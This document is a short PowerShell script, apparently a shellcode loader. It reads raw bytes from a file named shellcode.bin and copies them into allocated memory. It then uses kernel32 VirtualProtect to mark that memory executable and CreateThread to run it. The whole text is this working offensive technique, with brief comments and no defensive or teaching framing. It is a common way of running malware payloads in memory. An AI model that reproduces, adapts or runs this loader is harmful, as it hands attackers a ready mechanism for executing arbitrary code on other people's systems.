$sc = [System.IO.File]::ReadAllBytes("C:\shellcode.bin")

# Allocate memory (VirtualAlloc)
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)

# Copy shellcode to allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)

# Define VirtualProtect and CreateThread in a single Add-Type block
$Win32API = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@
Add-Type -TypeDefinition $Win32API -Language CSharp

# Change memory protection to executable
$OldProtect = 0
[Win32]::VirtualProtect($mem, $sc.Length, 0x40, [ref]$OldProtect)

# Create a thread to execute the shellcode
$thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Prevent the script from exiting immediately
[System.Threading.Thread]::Sleep(10000)